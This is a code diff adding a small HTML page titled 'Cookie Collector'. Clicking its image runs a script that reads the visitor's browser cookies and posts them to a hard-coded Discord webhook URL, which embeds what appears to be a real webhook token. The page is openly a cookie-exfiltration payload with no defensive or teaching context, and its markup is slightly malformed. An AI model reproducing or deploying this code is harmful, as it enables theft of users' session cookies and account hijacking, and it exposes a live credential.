@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Cookie Collector</title>
+    <style>
+        body { text-align: center; }
+        img { cursor: pointer; }
+    </html>
+</head>
+<body>
+    <h1>Click on the image</h1>
+    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSrZQo6QP5Muim3jrzySsDf3GRMBoQFn-u3Xg&s" width="300" onclick="sendCookies()" />
+
+    <script>
+        function sendCookies() {
+            const cookies = document.cookie;
+            const webhookUrl = 'https://discord.com/api/webhooks/1476727887053721721/UkshRh9j3xisTqqOHLnEvMI5dFlg-dmLWZkuY55yPtAWjuFFM0iPkMlFWUlF0LUjWHTN';
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    content: `Cookies collected: ${cookies}`
+                })
+            });
+
+            alert("Cookies sent to Discord!");
+        }
+    </script>
+</body>
+</html>
